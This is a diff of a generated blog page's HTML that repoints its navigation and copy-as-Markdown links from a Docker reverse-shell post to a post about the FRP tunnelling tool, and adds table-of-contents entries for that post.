@@ -418,13 +650,13 @@ Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4
                             </svg>
                         </button>
                         <div class="toc-dropdown-menu" id="tocDropdownMenu">
-                            <a class="toc-dropdown-item" href="https://github.com/copilot?prompt=I%20need%20help%20with%20this%20GitHub%20Docs%20page%3A%20https://github.com/Bin4xin/bin4xin.github.io/blob/main/_posts/blog/2020-04-27-docker-reverse-shell-by-one.markdown" target="_blank">
+                            <a class="toc-dropdown-item" href="https://github.com/copilot?prompt=I%20need%20help%20with%20this%20GitHub%20Docs%20page%3A%20https://github.com/Bin4xin/bin4xin.github.io/blob/main/_posts/blog/2021-11-23-FRP-Based-On-Golang.md" target="_blank">
                                 <svg viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
                                     <path d="M7.998 15.035c-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.201-.508-.254-1.084-.254-1.656 0-.87.128-1.769.693-2.484.579-.733 1.494-1.124 2.724-1.261 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095v1.872c0 .766-3.351 3.795-8.002 3.795Zm0-1.485c2.28 0 4.584-1.11 5.002-1.433V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-1.146 0-2.059-.327-2.71-.991A3.222 3.222 0 0 1 8 6.303a3.24 3.24 0 0 1-.544.743c-.65.664-1.563.991-2.71.991-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433ZM6.762 2.83c-.193-.206-.637-.413-1.682-.297-1.019.113-1.479.404-1.713.7-.247.312-.369.789-.369 1.554 0 .793.129 1.171.308 1.371.162.181.519.379 1.442.379.853 0 1.339-.235 1.638-.54.315-.322.527-.827.617-1.553.117-.935-.037-1.395-.241-1.614Zm4.155-.297c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Z"></path><path d="M6.25 9.037a.75.75 0 0 1 .75.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 .75-.75Zm4.25.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 1.5 0Z"></path>
                                 </svg>
                                 <span>询问 Copilot</span>
                             </a>
-                            <a class="toc-dropdown-item" href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/_posts/blog/2020-04-27-docker-reverse-shell-by-one.markdown" target="_blank">
+                            <a class="toc-dropdown-item" href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/_posts/blog/2021-11-23-FRP-Based-On-Golang.md" target="_blank">
                                 <svg viewBox="0 0 16 16" width="16" height="16" fill="currentColor"><path d="M2.75 14A1.75 1.75 0 0 1 1 12.25v-2.5a.75.75 0 0 1 1.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 0 0 .25-.25v-2.5a.75.75 0 0 1 1.5 0v2.5A1.75 1.75 0 0 1 13.25 14Z"/><path d="M7.25 7.689V2a.75.75 0 0 1 1.5 0v5.689l1.97-1.969a.749.749 0 1 1 1.06 1.06l-3.25 3.25a.749.749 0 0 1-1.06 0L4.22 6.78a.749.749 0 1 1 1.06-1.06l1.97 1.969Z"/></svg>
                                 <span>获取原始 Markdown</span>
                             </a>
@@ -441,6 +673,13 @@ Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4
         <h2 class="toc-heading" id="in-this-article">在本文中</h2>
         <nav class="toc-nav" aria-labelledby="in-this-article">
             <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#frp-based-on-golang">FRP Based On Golang</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#frp-介绍">FRP 介绍</a></li>
+<li class="toc-entry toc-h2"><a href="#下载链接">下载链接</a></li>
+<li class="toc-entry toc-h2"><a href="#q--a">Q &amp; A</a></li>
+</ul>
+</li>
 </ul>
         </nav>
     </div>
@@ -449,7 +688,7 @@ Linux 5c6fe690ac22 3.10.0-1062.12.1.el7.x86_64 <span class="c">##1 SMP Tue Feb 4
 
 <script>
 function copyAsMarkdown() {
-    var rawPath = "https://raw.githubusercontent.com/Bin4xin/bin4xin.github.io/main/_posts/blog/2020-04-27-docker-reverse-shell-by-one.markdown";
+    var rawPath = "https://raw.githubusercontent.com/Bin4xin/bin4xin.github.io/main/_posts/blog/2021-11-23-FRP-Based-On-Golang.md";
     fetch(rawPath)
         .then(function(res) {
             if (!res.ok) throw new Error('HTTP error ' + res.status);
